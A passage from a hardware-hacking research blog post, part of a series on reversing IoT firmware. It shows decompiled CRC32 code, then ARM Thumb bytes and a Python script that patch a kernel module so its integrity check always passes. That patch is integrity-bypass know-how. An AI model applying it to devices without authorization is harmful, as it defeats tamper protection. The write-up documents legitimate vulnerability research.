+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=n>idx_2</span> <span class=o>!=</span> <span class=n>param_2</span> <span class=o>+</span> <span class=n>param_3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>~</span><span class=n>param_1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The renamed <code>PDC_crc32</code> function is called multiple times in the module and is expected, on valid integrity conditions, to return the content pointed by <code>param_2 - 1</code>. This behavior have been identified across all <code>PDC_crc32</code> calls with the following pattern:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>res_crc32</span> <span class=o>=</span> PDC_crc32<span class=o>(</span>0,piVar1 + 1,*<span class=o>(</span>param_1 + 4<span class=o>)</span> + -4<span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span>res_crc32 !<span class=o>=</span> *piVar1<span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	OSA_logWrite<span class=o>(</span>2,2,<span class=s2>&#34;[pdc] DDRdata crc incorrect, Load from sramFile\n&#34;</span><span class=o>)</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	memcpy<span class=o>(</span>*<span class=o>(</span>param_1 + 0x18<span class=o>)</span>,*<span class=o>(</span>param_1 + 0x24<span class=o>)</span>,*<span class=o>(</span>param_1 + 4<span class=o>))</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#patching-the-kernel-module-crc32-integrity-check><h4 id=patching-the-kernel-module-crc32-integrity-check><span class=hanchor arialabel=Anchor># </span>Patching the kernel module CRC32 integrity check</h4></a><p>Having understood the CRC32 function logic, why not just patch the <code>PDC_crc32</code> kernel function to just return something that will pass the integrity verification?
+This is what we have done and the following ARM32 <em>THUMB</em> shellcode is able to change the <code>PDC_crc32</code> logic to always successfully pass all checks when called:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>push.w <span class=o>{</span>r4, r5, r6, r7, r8, sb, sl, lr<span class=o>}</span>
+</span></span><span class=line><span class=cl>sub.w  r1, r1, <span class=c1>#4</span>
+</span></span><span class=line><span class=cl>ldr    r0, <span class=o>[</span>r1<span class=o>]</span>
+</span></span><span class=line><span class=cl>pop.w  <span class=o>{</span>r4, r5, r6, r7, r8, sb, sl, pc<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>We first preserve registers through <code>push</code> and <code>pop</code> calls and we substract <code>r1</code> register and dereference it into the return register <code>r0</code>. The shellcode can be generated with the online
+<a href=https://shell-storm.org/online/Online-Assembler-and-Disassembler/ rel=noopener>ARM assembler/disassembler</a> and with some python scripting (I don&rsquo;t feel comfortable in using Ghidra or some other solutions for that) it&rsquo;s possible to create a customized version of the module:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>shutil</span>
+</span></span><span class=line><span class=cl><span class=n>OFFSET</span> <span class=o>=</span> <span class=mh>0x1574</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>shutil</span><span class=o>.</span><span class=n>copyfile</span><span class=p>(</span><span class=s2>&#34;pdc.ko&#34;</span><span class=p>,</span> <span class=s2>&#34;pdc_modded.ko&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># bd e8 f0 8f     pop.w      {r4,r5,r6,r7,r8,r9,r10,r11,pc}</span>
+</span></span><span class=line><span class=cl>    <span class=n>shellcode</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x2d\xe9\xf0\x47\xa1\xf1\x04\x01\x08\x68\xbd\xe8\xf0\x87</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;pdc_modded.ko&#34;</span><span class=p>,</span> <span class=s2>&#34;r+b&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>file</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=n>OFFSET</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>After some debugging through trials and errors we succeeded to make the kernel module working, and&mldr; the system rebooted after 40 seconds, again.</p><h2 id=heading></h2><a href=#conclusion--key-takeaways><h2 id=conclusion--key-takeaways><span class=hanchor arialabel=Anchor># </span>Conclusion & key takeaways</h2></a><p>As introduced in the
+<a href=https://www.hacktivesecurity.com/index.php/2024/12/10/not-all-roads-lead-to-pwn2own-hardware-hacking-part-1/ rel=noopener>first article</a> of the series, we took too much effort and time into trying to get a stable and working shell to just start the vulnerability research phase. The ability to understand when it&rsquo;s time to move on or to start getting things done with what you have, is an essential skill to maximize the efficiency of these kind of activities. We had also reversed the Android application, some Desktop binaries and tried few other things that weren&rsquo;t mentioned, but what you have read is a good extract of our overall activity on this target.</p><p>If you are interested into black and white box fuzzing, targeting another IoT device, stay tuned for the last part of the series!</p><a href=#references><h2 id=references><span class=hanchor arialabel=Anchor># </span>References</h2></a><ul><li><a href=https://www.zerodayinitiative.com/blog/2020/5/27/mindshare-how-to-just-emulate-it-with-qemu rel=noopener>MindShaRE: How to “Just Emulate It With QEMU”</a></li><li><a href=https://developer.toradex.com/software/linux-resources/linux-features/watchdog-linux/ rel=noopener>https://developer.toradex.com/software/linux-resources/linux-features/watchdog-linux/</a></li><li><a href=https://shell-storm.org/online/Online-Assembler-and-Disassembler/ rel=noopener>https://shell-storm.org/online/Online-Assembler-and-Disassembler/</a></li></ul></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/ data-ctx="notes/Not All Roads Lead to PWN2OWN - Firmware Reverse Engineering (Part 2)" data-src=/ class=internal-link>👾 KIKS.</a></li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://1day.dev/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Powered by <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2025</p><ul><li><a href=https://1day.dev/>Home</a></li><li><a href=https://twitter.com/kiks7_7>Twitter</a></li><li><a href=https://github.com/kiks7>Github</a></li></ul></footer></div></div></body></html>
